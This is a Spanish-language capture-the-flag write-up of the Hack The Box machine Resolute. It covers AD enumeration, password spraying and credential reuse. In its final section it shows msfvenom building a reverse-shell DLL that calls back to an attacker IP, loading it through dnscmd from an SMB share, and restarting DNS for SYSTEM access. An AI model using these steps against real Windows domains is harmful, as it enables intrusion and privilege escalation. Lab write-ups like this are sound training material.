---
layout: single
title: HTB-Resolute
excerpt: "WriteUp con metodología de la máquina Resolute."
date: 2021-12-07
classes: wide
header:
  icon: /assets/images/hackthebox.webp
  teaser_home_page: true
  teaser: /assets/images/WriteUps/Resolute.png
categories:
  - WriteUps
tags:
  - HTB

---


<center><img src='/assets/images/WriteUps/Resolute.png'></center>

IP -> 10.10.10.169

# Reconocimiento
## Nmap
Utilizamos [nmap](/Nmap/) y obtenemos los siguientes resultados.
[Resolute Nmap Result](/assets/files/WriteUps/Resolute.txt)

## Crackmapexec
Usamos [Crackmapexec](/Crackmapexec/) para enumerar información del [Active Directory](/Active-Directory/) y añadimos el dominio al /etc/hosts
> OS: Windows Server 2016 x64
> Dominio: megabank.local
> Signing: True
> SMBv1: True


## smbclient y smbhost
Listamos servicios del [SMB](/SMB/) mediante un [null session](/SMB/
> No encontramos nada


## rpc
Mediante el servicio [rpc](/rpc/) enumeramos los usuarios que pertenecen al [Active Directory](/Active-Directory/)

## kerberos
Validamos los usuarios que hemos obtenido mediante [Kerberos](/Kerberos/) con la utilidad [kerbrute]((/Kerberos/)

## rpc
Mediante [rpc](/rpc/) enumeramos los grupos del [Active Directory](/Active-Directory/)
> Obtenemos un listado de usuarios

## crackmapexc
Con la herramienta [Crackmapexec](/Crackmapexec/) validamos los usuarios y tomando como contraseña los mismos usuarios

```bash
crackmapexec smb 10.10.10.169 -u users -p users
```

## GetNPUsers.py
Probamos un [ASREPRoast](/ASREPRoast/) con la herramienta [GetNPUsers.py]((/ASREPRoast/)

## rpc
Seguimos enumerando mediante [rpc](/rpc/) las descripciones de los usuarios.

> marko: Account created. Password set to Welcome123!

## Crackmapexec
Con [Crackmapexec](/Crackmapexec/) validamos si es válida la credencial
> Es incorrecta

Pero vamos a probar con todo el listado de usuarios
```bash
crackmapexec smb 10.10.10.169 -u users -p 'Welcome123!' --continue-on-success
```

> Melanie tiene esta credencial

Aunque Melanie tiene esta credencial, no tiene "pwned" por smb, por lo tanto no podemos conectarnos a una shell interactiva.

## GetUserSPN.py
Probamos un [Kerberoasting](/Kerberoasting/) Attack con la credenciales obtenidas pero no obtenemos ningun TGS

## Crackmapexec
Probamos las credenciales por [winrm](/winrm/)
```bash
crackmapexec winrm 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```

> PWNED

# Exploitation
## Evil-winrm
[[winrm](/winrm/). Nos conectamos a la máquina como el usuario **melanie**.

> user.txt

# User-pivoting
Enumeramos el sistema.
```powershell
whoami /priv
net user melanie
whoami /all
net users
cd C:\\
ls
```
> Poco contenido
```powershell
ls -force
```
> Más contenido
> directorio: PSTranscripts
Listamos todo lo que hay bajo esae directorio
```powershell
ls -force PSTranscripts/ -recurse
```
> Archivo \*.txt
Mostramos el contenido del txt
```powershell
type <file>.txt
```
> PowerShell LOG
> Credenciales: ryan -> Serv3r4Admin4cc123!

## Crackmapexec
Probamos las credenciales en crackmapexec tanto por [SMB](/SMB/) como por [winrm](/winrm/)

> SMB: PWNED
> WINRM: PWNED

# Exploitation
## Evil-winrm
[[winrm](/winrm/). Nos conectamos a la máquina como el usuario **ryan**.

# Privilege-escalation
Enumeramos el directorio del usuario ryan y los privilegios del usuario.

```powershell
whoami /priv
net user melanie
whoami /all
net users
dir Desktop
```

> Desktop: note.txt
> Group: DnsAdmins

Buscamos en hacktricks acerca del [DnsAdmins](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#dnsadmins)

Nos permite cargar una DLL maliciosa.

# Exploitation

## msfvenom
Nos creamos la dll maliciosa con msfvenom.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o rev.dll
```

Creamos un servicio compartido con [[smbserver.py]]

Cargamos la dll
```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.14.10\smbFolder\rev.dll
```

Reniciamos el servicio
> Necesitamos el hostname
```powershell
hostname
```

> Hostname: Resolute

Nos ponemos en escucha

```bash
rlwrap nc -nlvp 443
```

Reiniciamos el servicio

```powershell
sc.exe \\Resolute stop dns
sc.exe \\Resolute start dns
```


> root.txt


---

Escrito el 07-12-2021 a las 08:00 pm por creep33.
